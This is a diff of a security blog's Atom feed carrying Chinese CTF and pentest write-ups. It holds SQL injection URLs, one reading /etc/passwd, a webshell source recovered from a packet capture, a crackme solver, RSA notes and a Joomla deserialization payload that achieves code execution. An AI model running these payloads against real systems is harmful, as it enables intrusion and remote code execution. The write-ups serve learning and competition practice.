@@ -5,7 +5,7 @@
   <subtitle><![CDATA[Blog]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="http://0x48.pw//"/>
-  <updated>2016-03-28T07:55:38.430Z</updated>
+  <updated>2016-03-28T10:18:36.674Z</updated>
   <id>http://0x48.pw//</id>
   
   <author>
@@ -20,8 +20,11 @@
     <link href="http://0x48.pw/2016/03/21/0x15/"/>
     <id>http://0x48.pw/2016/03/21/0x15/</id>
     <published>2016-03-21T02:16:46.000Z</published>
-    <updated>2016-03-28T07:55:38.430Z</updated>
-    <content type="html"><![CDATA[<p><img src="/img/pent.png" alt="pentest"><br><a id="more"></a><br>玩了下exploit, 再来玩玩pentest。</p>
+    <updated>2016-03-28T10:18:36.674Z</updated>
+    <content type="html"><![CDATA[<blockquote>
+<p>玩了下exploit, 再来玩玩pentest。</p>
+</blockquote>
+<a id="more"></a>
 <h1 id="SQLI">SQLI</h1><h2 id="Example_1">Example 1</h2><p>没做任何过滤，简单。。不过看了下，mysql的用户没啥权限，所以最多就是查看数据库信息了，没法读系统文件，写文件getshell。。<br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example1.php?name=admin<span class="number">%27</span><span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>version(),load_file(<span class="number">%22</span>/etc/passwd<span class="number">%22</span>),user(),4,5<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="Example_2">Example 2</h2><p>这题就过滤了空格呗。。也简单。。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.102/sqli/example2.php?name=root%27<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="operator"><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">version</span>(),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span>%<span class="number">23</span></span><br><span class="line">http://<span class="number">192.168</span>.56.102/sqli/example2.php?name=root%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>SCHEMA_NAME,<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.SCHEMATA%<span class="number">23</span></span><br><span class="line">http://<span class="number">192.168</span>.56.102/sqli/example2.php?name=root%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>TABLE_NAME,<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">TABLES</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=%<span class="number">22</span>exercises%<span class="number">22</span>%<span class="number">23</span></span></span><br></pre></td></tr></table></figure></p>
 <h2 id="Example_3">Example 3</h2><p>只能说上题的payload还能用。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">http</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example3.php?name=root%<span class="number">27</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="function">user</span>(),<span class="function">database</span>(),<span class="function">version</span>(),<span class="number">4</span>,<span class="number">5%</span><span class="number">23</span></span></span></span><br></pre></td></tr></table></figure></p>
@@ -78,7 +81,9 @@
 <h2 id="Example_2-7">Example 2</h2><p>这题过滤了php结尾的文件。。。然后php3 bypass后可成功执行</p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="/img/pent.png" alt="pentest"><br>]]>
+    <![CDATA[<blockquote>
+<p>玩了下exploit, 再来玩玩pentest。</p>
+</blockquote>]]>
     
     </summary>
     
@@ -93,8 +98,12 @@
     <link href="http://0x48.pw/2016/03/17/0x14/"/>
     <id>http://0x48.pw/2016/03/17/0x14/</id>
     <published>2016-03-17T01:18:02.000Z</published>
-    <updated>2016-03-28T10:01:25.710Z</updated>
-    <content type="html"><![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-0ctf.png" alt="rsa"><br><a id="more"></a><br><em>果然不是信息安全专业的，只是自学会有很多技能点的缺失。</em><br>该题用的是中国剩余定理，顺便学了一遍RSA，发现了数学技能点的缺失</p>
+    <updated>2016-03-28T10:18:43.374Z</updated>
+    <content type="html"><![CDATA[<blockquote>
+<p>果然不是信息安全专业的，只是自学会有很多技能点的缺失。</p>
+</blockquote>
+<a id="more"></a>
+<p>该题用的是中国剩余定理，顺便学了一遍RSA，发现了数学技能点的缺失</p>
 <p>(PS: ^表示为次方，xor才是异或，％和mod为求余，/表示为整除)</p>
 <h1 id="RSA学习笔记">RSA学习笔记</h1><p>先来学学前置技能</p>
 <h2 id="前置技能">前置技能</h2><h3 id="学前符号助记">学前符号助记</h3><p>$ x = y\ (mod\ n) $         可以看成是        $ x \% n = y$<br>$ x \equiv y\ (mod\ n)$      可以看成是        $ x \% n = y \% n$</p>
@@ -173,7 +182,9 @@
 <p>研究这研究了一个星期，表示心累，解密脚本看github那篇wp去吧。。撸BCTF去了。。。</p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-0ctf.png" alt="rsa"><br>]]>
+    <![CDATA[<blockquote>
+<p>果然不是信息安全专业的，只是自学会有很多技能点的缺失。</p>
+</blockquote>]]>
     
     </summary>
     
@@ -188,8 +199,11 @@
     <link href="http://0x48.pw/2016/03/15/0x13/"/>
     <id>http://0x48.pw/2016/03/15/0x13/</id>
     <published>2016-03-15T00:35:30.000Z</published>
-    <updated>2016-03-15T03:10:47.933Z</updated>
-    <content type="html"><![CDATA[<p><img src="/img/alictf0.png" alt="alictf0"><br><a id="more"></a><br>这算是今年的阿里CTF？昨天小伙伴在玩这个，我在研究0CTF的WEB题，今早知道真相的我眼泪掉下来。上周五刚面了一轮。。。</p>
+    <updated>2016-03-28T10:19:01.890Z</updated>
+    <content type="html"><![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-alictf0.png" alt="alictf0"></p>
+<blockquote>
+<p>这算是今年的阿里CTF？昨天小伙伴在玩这个，我在研究0CTF的WEB题，今早知道真相的我眼泪掉下来。上周五刚面了一轮。。。<br><a id="more"></a></p>
+</blockquote>
 <h1 id="Step_0">Step 0</h1><p>上图中的base64解码呗。。<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo <span class="string">"aHR0cDovLzIxOC4yNDQuMTQzLjE5OC8="</span> <span class="string">| base64 -d</span></span><br><span class="line">http:<span class="comment">//218.244.143.198/</span></span><br></pre></td></tr></table></figure></p>
 <p>打开来是一个 伪造？ 的sqlmap网站，右键查看源码， 有一坨jsfuck，太长了，这里就不贴了。。直接丢F12里面的console运行，得到：<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">218.244</span>.143.198<span class="regexp">/.svn/</span></span><br></pre></td></tr></table></figure></p>
 <p>那就svn泄露呗，记得以前做过这样的题，记不清楚了，google一下，</p>
@@ -205,13 +219,15 @@
 <p>这题呢，就属于那种就简单的把，先过滤出来http协议，然后发现第一个backdoor.php，然后整理了下这个后门的源码<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">@ini_set</span>(<span class="string">"display_errors"</span>,<span class="string">"0"</span>);</span><br><span class="line"><span class="variable">@set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">@set_magic_quotes_runtime</span>(<span class="number">0</span>);</span><br><span class="line">echo(<span class="string">"-&gt;|"</span>);</span><br><span class="line"><span class="variable">$D</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">"z1"</span>]);</span><br><span class="line"><span class="variable">$F</span>=<span class="variable">@opendir</span>(<span class="variable">$D</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span>==<span class="constant">NULL</span>) &#123;</span><br><span class="line">	echo(<span class="string">"ERROR:// Path Not Found Or No Permission!"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$M</span>=<span class="constant">NULL</span>;</span><br><span class="line">	<span class="variable">$L</span>=<span class="constant">NULL</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="variable">$N</span>=<span class="variable">@readdir</span>(<span class="variable">$F</span>)) &#123;</span><br><span class="line">		<span class="variable">$P</span>=<span class="variable">$D</span>.<span class="string">"/"</span>.<span class="variable">$N</span>;</span><br><span class="line">		<span class="variable">$T</span>=<span class="variable">@date</span>(<span class="string">"Y-m-d H:i:s"</span>,<span class="variable">@filemtime</span>(<span class="variable">$P</span>));</span><br><span class="line">		@<span class="variable">$E</span>=substr(base_convert(<span class="variable">@fileperms</span>(<span class="variable">$P</span>),<span class="number">10</span>,<span class="number">8</span>),-<span class="number">4</span>);</span><br><span class="line">		<span class="variable">$R</span>=<span class="string">"\t"</span>.<span class="variable">$T</span>.<span class="string">"\t"</span>.<span class="variable">@filesize</span>(<span class="variable">$P</span>).<span class="string">"\t"</span>.<span class="variable">$E</span>.<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">@is_dir</span>(<span class="variable">$P</span>)) <span class="variable">$M</span>.=<span class="variable">$N</span>.<span class="string">"/"</span>.<span class="variable">$R</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="variable">$L</span>.=<span class="variable">$N</span>.<span class="variable">$R</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	echo <span class="variable">$M</span>.<span class="variable">$L</span>;</span><br><span class="line">	<span class="variable">@closedir</span>(<span class="variable">$F</span>);</span><br><span class="line">&#125;;</span><br><span class="line">echo(<span class="string">"|&lt;-"</span>);</span><br><span class="line">die(); </span><br><span class="line"><span class="prompt">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>然后发现ip和该题的题目链接ip一样，去试试，没有这后门文件，那就从数据包入手。右击 -&gt; Follow TCP Stream<br>得到另一个文件<code>wllm</code>, 访问得<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">find</span> data <span class="keyword">package</span> careful, you will <span class="keyword">find</span> <span class="keyword">next</span> level url , that will be a crackme</span><br></pre></td></tr></table></figure></p>
 <p>所以说下一题的入口还是在数据包里。。。看着一坨的http包，好吧，继续过滤 <code>http &amp;&amp; ip.addr==218.244.143.198</code><br>然后从第四个POST包中的参数z2中得到下一题的入口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"YUhSMGNEb3ZMekl4T0M0eU5EUXVNVFF6TGpFNU9DOXpkR0YwYVdNdlkzSmhZMnR0WlE9PQ=="</span> | base64 <span class="operator">-d</span>| base64 <span class="operator">-d</span></span><br><span class="line">http://<span class="number">218.244</span>.<span class="number">143.198</span>/static/crackme</span><br></pre></td></tr></table></figure></p>
-<h1 id="Step_2">Step 2</h1><p>linux64位逆向题呗。。。比Z神出的简单多了，直接丢到ida中，F5，关键部分如图所示<br><img src="/img/alictf1.png" alt="alictf1"><br>payload:<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crack.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">secret = [<span class="number">0x8</span>, <span class="number">0x45</span>, <span class="number">0x0A</span>, <span class="number">0x42</span>, <span class="number">0x4b</span>, <span class="number">0x31</span>, <span class="number">0x6d</span>, <span class="number">0x2f</span>, <span class="number">0x52</span>, <span class="number">0x0b</span>, <span class="number">0x16</span>, <span class="number">0x23</span>] </span><br><span class="line">secret1 = [<span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x23</span>, <span class="number">0x6b</span>, <span class="number">0x6c</span>, <span class="number">0x25</span>, <span class="number">0x72</span>, <span class="number">0x29</span>, <span class="number">0x6b</span>, <span class="number">0x73</span>, <span class="number">0x6b</span>]</span><br><span class="line"><span class="literal">result</span> = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="type">range</span>(<span class="number">12</span>):</span><br><span class="line">	tmp = secret[x] ^ secret1[x] ^ <span class="number">0xF</span></span><br><span class="line">	<span class="literal">result</span> += chr(tmp)</span><br><span class="line"></span><br><span class="line"><span class="literal">result</span> += <span class="string">"a"</span></span><br><span class="line">print <span class="literal">result</span></span><br><span class="line"><span class="comment"># $ python crack.py | ./crackme</span></span><br><span class="line"><span class="comment"># I want ur password:Yes!</span></span><br><span class="line"><span class="comment"># $ python crack.py</span></span><br><span class="line"><span class="comment"># t.cn/RGRtojGa</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="Step_2">Step 2</h1><p>linux64位逆向题呗。。。比Z神出的简单多了，直接丢到ida中，F5，关键部分如图所示<br><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-alictf1.png" alt="alictf1"><br>payload:<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crack.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">secret = [<span class="number">0x8</span>, <span class="number">0x45</span>, <span class="number">0x0A</span>, <span class="number">0x42</span>, <span class="number">0x4b</span>, <span class="number">0x31</span>, <span class="number">0x6d</span>, <span class="number">0x2f</span>, <span class="number">0x52</span>, <span class="number">0x0b</span>, <span class="number">0x16</span>, <span class="number">0x23</span>] </span><br><span class="line">secret1 = [<span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x23</span>, <span class="number">0x6b</span>, <span class="number">0x6c</span>, <span class="number">0x25</span>, <span class="number">0x72</span>, <span class="number">0x29</span>, <span class="number">0x6b</span>, <span class="number">0x73</span>, <span class="number">0x6b</span>]</span><br><span class="line"><span class="literal">result</span> = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="type">range</span>(<span class="number">12</span>):</span><br><span class="line">	tmp = secret[x] ^ secret1[x] ^ <span class="number">0xF</span></span><br><span class="line">	<span class="literal">result</span> += chr(tmp)</span><br><span class="line"></span><br><span class="line"><span class="literal">result</span> += <span class="string">"a"</span></span><br><span class="line">print <span class="literal">result</span></span><br><span class="line"><span class="comment"># $ python crack.py | ./crackme</span></span><br><span class="line"><span class="comment"># I want ur password:Yes!</span></span><br><span class="line"><span class="comment"># $ python crack.py</span></span><br><span class="line"><span class="comment"># t.cn/RGRtojGa</span></span><br></pre></td></tr></table></figure></p>
 <p>去掉最后的a，就是下一题的入口了</p>
 <h1 id="Step_3">Step 3</h1><p><a href="http://112.124.106.246/7fbde8d70c816033/index.php" target="_blank" rel="external">http://112.124.106.246/7fbde8d70c816033/index.php</a><br>打开来一看是…..Joomla。。。。。。。。。。<br>0CTF的piapiapia那题搜关于php序列化的漏洞搜出来的全是这个博客的反序列化截断漏洞。。。。<br>然后发现这漏洞阿里云还写了分析报告，好了。。。估计就是这洞了。。。<br>payload:<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="variable">url =</span> <span class="string">"http://112.124.106.246/7fbde8d70c816033/index.php"</span></span><br><span class="line"><span class="variable">header =</span> &#123;</span><br><span class="line">	<span class="string">"X-Forwarded-For"</span>: '&#125;__test|O:<span class="number">21</span>:<span class="string">"JDatabaseDriverMysqli"</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">"fc"</span>;O:<span class="number">17</span>:<span class="string">"JSimplepieFactory"</span>:<span class="number">0</span>:&#123;&#125;s:<span class="number">21</span>:<span class="string">"\\0\\0\\0disconnectHandlers"</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">9</span>:<span class="string">"SimplePie"</span>:<span class="number">5</span>:&#123;s:<span class="number">8</span>:<span class="string">"sanitize"</span>;O:<span class="number">20</span>:<span class="string">"JDatabaseDriverMysql"</span>:<span class="number">0</span>:&#123;&#125;s:<span class="number">8</span>:<span class="string">"feed_url"</span>;s:<span class="number">37</span>:<span class="string">"phpinfo();JFactory::getConfig();exit;"</span>;s:<span class="number">19</span>:<span class="string">"cache_name_function"</span>;s:<span class="number">6</span>:<span class="string">"assert"</span>;s:<span class="number">5</span>:<span class="string">"cache"</span>;b:<span class="number">1</span>;s:<span class="number">11</span>:<span class="string">"cache_class"</span>;O:<span class="number">20</span>:<span class="string">"JDatabaseDriverMysql"</span>:<span class="number">0</span>:&#123;&#125;&#125;i:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">"init"</span>;&#125;&#125;s:<span class="number">13</span>:<span class="string">"\\0\\0\\0connection"</span>;b:<span class="number">1</span>;&#125;\xf0',</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">req =</span> requests.get(url, <span class="variable">headers=</span>header)</span><br><span class="line">print req.content</span><br><span class="line"><span class="comment"># $ python payload.py</span></span><br><span class="line"><span class="comment"># Success! key:xxxxxxxxxxxxxxxxxxxxx 发简历时附加此key有加分</span></span><br></pre></td></tr></table></figure></p>
 <p>撸了两节课撸完了。。。还是继续研究0CTF去了。。</p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="/img/alictf0.png" alt="alictf0"><br>]]>
+    <![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-alictf0.png" alt="alictf0"></p>
+<blockquote>
+<p>这算是今年的阿里CTF？昨天小伙伴在玩这个，我在研究0CTF的WEB题，今早知道真相的我眼泪掉下来。上周五刚面了一轮。。。<br>]]>
     
     </summary>
     
@@ -226,9 +242,11 @@
     <link href="http://0x48.pw/2016/03/14/0x12/"/>
     <id>http://0x48.pw/2016/03/14/0x12/</id>
     <published>2016-03-14T02:25:27.000Z</published>
-    <updated>2016-03-15T10:02:54.000Z</updated>
-    <content type="html"><![CDATA[<p><img src="/img/0ctf.png" alt="0ctf"><br><a id="more"></a></p>
+    <updated>2016-03-28T10:19:17.570Z</updated>
+    <content type="html"><![CDATA[<blockquote>
 <p>这次的0CTF我们投机取巧派被学院派教做人。。然后发现自己，不会js，不会php。不会python。web题看了两题，都差一点出来。。</p>
+</blockquote>
+<a id="more"></a>
 <h1 id="rand_2">rand_2</h1><p>题目源码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'time'</span>] &amp;&amp; time() - <span class="variable">$_SESSION</span>[<span class="string">'time'</span>] &gt; <span class="number">60</span>) &#123;</span><br><span class="line">	session_destroy();</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'timeout'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">'time'</span>] = time();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> rand();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'go'</span>])) &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">'rand'</span>] = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$i</span> = <span class="number">5</span>;</span><br><span class="line">	<span class="variable">$d</span> = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="variable">$i</span>--)&#123;</span><br><span class="line">		<span class="variable">$r</span> = (string)rand();</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">'rand'</span>][] = <span class="variable">$r</span>;</span><br><span class="line">                <span class="variable">$d</span> .= <span class="variable">$r</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> md5(<span class="variable">$d</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'check'</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'check'</span>] === <span class="variable">$_SESSION</span>[<span class="string">'rand'</span>]) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'die'</span>;</span><br><span class="line">		session_destroy();</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
 <p>这题看了国外的论文后知道了通过rand()随机出来的伪随机数有一个规律：<code>r[i] = r[i-3] + r[i-31]</code></p>
 <p>这里有一个需要注意的地方，题目服务器是ubuntu<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php&gt; echo <span class="function"><span class="title">getrandmax</span><span class="params">()</span></span> </span><br><span class="line"><span class="number">2147483647</span></span><br></pre></td></tr></table></figure></p>
@@ -248,7 +266,9 @@
 <p>然后是复现这题，在复现的过程中随便学习了下运维。。</p>
 <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># 新建组</span><br><span class="line">$ groupadd ctf5</span><br><span class="line"># 新建一个专门用于php-fpm的用户</span><br><span class="line">$ useradd ctf5 -<span class="keyword">M</span> -s /sbin/nologin -<span class="keyword">g</span> ctf5</span><br><span class="line"># 创建pid, sock文件</span><br><span class="line">$ touch /usr/<span class="keyword">local</span>/php/<span class="keyword">var</span>/<span class="keyword">run</span>/php-fpm-ctf5.pid</span><br><span class="line">$ touch /tmp/php-cgi-ctf5.sock</span><br><span class="line"># sock是被nginx使用所以需要把所属用户和用户组改成和nginx一样</span><br><span class="line">$ chown www:www /tmp/php-cgi-ctf5.sock</span><br><span class="line"># 修改nginx虚拟主机文件</span><br><span class="line">$ vim /usr/<span class="keyword">local</span>/nginx/<span class="keyword">conf</span>/vhost/ctf5.<span class="keyword">conf</span></span><br><span class="line">    fastcgi_pass  unix:/tmp/php-cgi-ctf5.sock;    #修改成这样</span><br><span class="line"># 创建php-fpm配置文件</span><br><span class="line">$ cp /usr/<span class="keyword">local</span>/php/etc/php-fpm.<span class="keyword">conf</span> /usr/<span class="keyword">local</span>/php/etc/php-fpm-ctf5.<span class="keyword">conf</span></span><br><span class="line">$ vim /usr/<span class="keyword">local</span>/php/etc/php-fpm-ctf5.<span class="keyword">conf</span></span><br><span class="line">[<span class="keyword">global</span>]</span><br><span class="line">pid = /usr/<span class="keyword">local</span>/php/<span class="keyword">var</span>/<span class="keyword">run</span>/php-fpm-ctf5.pid</span><br><span class="line">error_log = /usr/<span class="keyword">local</span>/php/<span class="keyword">var</span>/<span class="keyword">log</span>/php-fpm-ctf5.<span class="literal">log</span></span><br><span class="line">log_level = notice</span><br><span class="line"></span><br><span class="line">[ctf5]</span><br><span class="line">listen = /tmp/php-cgi-ctf5.sock</span><br><span class="line">listen.backlog = -1</span><br><span class="line">listen.allowed_clients = 127.0.0.1</span><br><span class="line">listen.owner = ctf5</span><br><span class="line">listen.group = ctf5</span><br><span class="line">listen.mode = 0666</span><br><span class="line">user = ctf5</span><br><span class="line">group = ctf5</span><br><span class="line">pm = dynamic</span><br><span class="line">pm.max_children = 10</span><br><span class="line">pm.start_servers = 1</span><br><span class="line">pm.min_spare_servers = 1</span><br><span class="line">pm.max_spare_servers = 6</span><br><span class="line">request_terminate_timeout = 100</span><br><span class="line">request_slowlog_timeout = 0</span><br><span class="line">slowlog = <span class="keyword">var</span>/<span class="keyword">log</span>/slow-ctf5.<span class="literal">log</span></span><br><span class="line"></span><br><span class="line"># 修改/etc/init.<span class="keyword">d</span>/php-fpm</span><br><span class="line">vhost=<span class="label">$2</span></span><br><span class="line"><span class="keyword">if</span> [ -<span class="keyword">n</span> <span class="string">"$vhost"</span> ];then</span><br><span class="line">        vhost=-<span class="label">$vhost</span></span><br><span class="line">fi</span><br><span class="line">php_fpm_CONF=<span class="label">$&#123;prefix&#125;</span>/etc/php-fpm<span class="label">$vhost</span>.<span class="keyword">conf</span></span><br><span class="line">php_fpm_PID=<span class="label">$&#123;prefix&#125;</span>/<span class="keyword">var</span>/<span class="keyword">run</span>/php-fpm<span class="label">$vhost</span>.pid</span><br><span class="line"></span><br><span class="line">restart)</span><br><span class="line">                <span class="label">$0</span> stop <span class="label">$2</span></span><br><span class="line">                <span class="label">$0</span> start <span class="label">$2</span></span><br><span class="line"></span><br><span class="line"># 修改文件夹权限</span><br><span class="line">$ chown ctf5:www -R 